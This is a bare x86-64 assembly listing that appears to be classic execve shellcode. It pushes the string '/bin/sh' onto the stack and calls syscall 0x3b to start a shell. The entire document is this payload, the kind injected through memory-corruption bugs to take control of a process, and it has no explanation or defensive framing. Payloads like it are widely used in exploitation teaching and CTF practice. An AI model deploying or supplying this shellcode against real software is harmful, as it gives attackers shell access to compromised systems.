section .text
BITS 64
global _start

_start:
    mov rax, 0x68732f6e69622f 
    push rax

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall